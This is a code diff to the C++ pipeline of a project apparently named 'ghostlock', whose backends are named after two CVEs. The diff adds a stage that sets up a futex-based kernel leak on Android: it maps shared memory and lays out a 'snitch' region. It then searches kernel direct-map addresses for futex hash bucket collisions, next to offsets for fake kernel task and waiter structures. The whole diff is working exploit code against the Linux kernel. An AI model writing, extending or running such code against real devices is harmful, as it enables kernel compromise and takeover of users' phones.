@@ -14,6 +14,15 @@
 #include "backend/cve_2026_43284/seam/real_splice_io.hpp"
 #include "backend/cve_2026_43284/session_frame.hpp"
 #include "backend/cve_2026_43499/abi.hpp"
+#include "backend/cve_2026_43499/leak/collision_buckets.hpp"
+#include "backend/cve_2026_43499/leak/snitch_region.hpp"
+/* The device seam's header includes linux/futex.h and this file is compiled for the host as well,
+ *  because main.cpp calls it from both. The one step that needs the seam is guarded by platform, not
+ *  by a switch: there is no build of this file where a host can map shared memory through it. */
+#ifdef __ANDROID__
+#include "backend/cve_2026_43499/leak/snitch_seam_linux.hpp"
+#endif
+#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
 #include "contract/chain_catalog.hpp"
 #include "profile/document_pairs.hpp"
 #include "contract/op_registry.hpp"
@@ -170,6 +179,106 @@ namespace ghostlock::pipeline {
                     static_cast<unsigned long>(offsets.lock_offset),
                     static_cast<unsigned long>(offsets.waiter_w0_offset),
                     static_cast<unsigned long>(offsets.fake_task_offset));
+
+        /* 6. The corpus, copied from the device probe that built it and ran on this hardware. Every
+         *    number below is either from there or is one of the declared temporary values the
+         *    checklist registers; the reasons in the probe comments travel with them. */
+        /* Two of the inputs are measured here rather than declared, because they are properties of
+         *  the machine this runs on and asking the kernel is the only honest source. */
+        const std::uint64_t page_bytes = static_cast<std::uint64_t>(::sysconf(_SC_PAGESIZE));
+        const std::uint64_t cpus = static_cast<std::uint64_t>(::sysconf(_SC_NPROCESSORS_ONLN));
+        std::printf("run-temp: device reports page=%lu cpus=%lu\n",
+                    static_cast<unsigned long>(page_bytes), static_cast<unsigned long>(cpus));
+
+        backend::cve_2026_43499::leak::SnitchInputs snitch_inputs{};
+        snitch_inputs.page_size = page_bytes;
+        snitch_inputs.mm_struct_size = 0x1000U;
+        snitch_inputs.mm_slab_order = 0U;
+        snitch_inputs.collisions = 2U;
+        snitch_inputs.thread_count = 1U;
+        snitch_inputs.possible_cpus = cpus;
+
+        backend::cve_2026_43499::leak::SnitchSetup setup{};
+        const backend::cve_2026_43499::leak::SnitchSetupVerdict built =
+            backend::cve_2026_43499::leak::build_snitch_setup(snitch_inputs, setup);
+        std::printf("run-temp: snitch setup %s\n",
+                    backend::cve_2026_43499::leak::snitch_setup_verdict_name(built));
+        if (built != backend::cve_2026_43499::leak::SnitchSetupVerdict::Ok) {
+            return 10;
+        }
+
+        backend::cve_2026_43499::leak::RegionInputs region{};
+        region.header_bytes = 256U;
+        region.collisions = 2U;
+        region.thread_count = 2U;
+        region.total_pokes = 1024U;
+        region.page_size = 4096U;
+        region.word_bytes = 8U;
+        region.handle_bytes = 8U;
+        backend::cve_2026_43499::leak::RegionLayout region_layout{};
+        const backend::cve_2026_43499::leak::RegionVerdict laid =
+            backend::cve_2026_43499::leak::layout_snitch_region(region, region_layout);
+        std::printf("run-temp: region %s, total %zu bytes\n",
+                    backend::cve_2026_43499::leak::region_verdict_name(laid), region_layout.total_bytes);
+        if (laid != backend::cve_2026_43499::leak::RegionVerdict::Ok) {
+            return 10;
+        }
+
+        /* 7. The rest of the walk's geometry, copied from the probe. The slice is inside the direct map
+         *    rather than a range from zero, because the walk only hashes the addresses it is given and
+         *    never touches memory; the probe's comment records why that matters -- a stub that answered
+         *    everything answered with zero. */
+        backend::cve_2026_43499::leak::CollisionBuckets buckets{};
+        if (backend::cve_2026_43499::leak::futex_hash_context_init(&buckets.context, 64U) != 0) {
+            std::printf("run-temp: the hash context refused its table size\n");
+            return 10;
+        }
+        buckets.mm = 0U;
+
+#ifdef __ANDROID__
+        const backend::cve_2026_43499::leak::MapResult words_region =
+            backend::cve_2026_43499::leak::LinuxSnitchSeam::map_shared(4096U);
+        if (words_region.address == nullptr) {
+            std::printf("run-temp: the cohort words could not be mapped (errno %d)\n",
+                        words_region.error);
+            return 10;
+        }
+        auto *words_base = static_cast<unsigned char *>(words_region.address);
+        std::uint32_t *word_ptrs[2] = {reinterpret_cast<std::uint32_t *>(words_base),
+                                       reinterpret_cast<std::uint32_t *>(words_base + 64U)};
+#else
+        /* The host has no seam to map the cohort words through, so that step is named and refused
+         *  rather than approximated. Everything before it is the same code on both platforms. */
+        std::printf("run-temp: the cohort words need a device; stopping before the search\n");
+        return 10;
+#endif
+
+        backend::cve_2026_43499::leak::ScanStrides strides{};
+        strides.coarse = 4096U;
+        strides.slab = 1024U;
+        strides.candidate = 256U;
+        backend::cve_2026_43499::leak::ScanRange scan_range{};
+        scan_range.start = 0xffff800000100000ULL;
+        scan_range.end = scan_range.start + 0x10000ULL;
+
+        /* The proof addresses are observed rather than chosen: the second one is found by asking the
+         *  real rule which address in the slice shares the first one's bucket. Two arbitrary addresses
+         *  would be asking the rule about something nobody observed. */
+        std::uint64_t address_table[2] = {scan_range.start, 0U};
+        const std::uint64_t wanted_bucket = buckets.bucket_of(address_table[0]);
+        for (std::uint64_t at = scan_range.start + 4096U;
+             address_table[1] == 0U && at < scan_range.start + 0x100000ULL; at += 4096U) {
+            if (buckets.bucket_of(at) == wanted_bucket) {
+                address_table[1] = at;
+            }
+        }
+        std::printf("run-temp: proofs bucket=%lu second=0x%lx (observed, not chosen)\n",
+                    static_cast<unsigned long>(wanted_bucket),
+                    static_cast<unsigned long>(address_table[1]));
+        if (address_table[1] == 0U) {
+            std::printf("run-temp: no second address was observed in the slice\n");
+            return 10;
+        }
         return 0;
     }
 }  // namespace ghostlock::pipeline
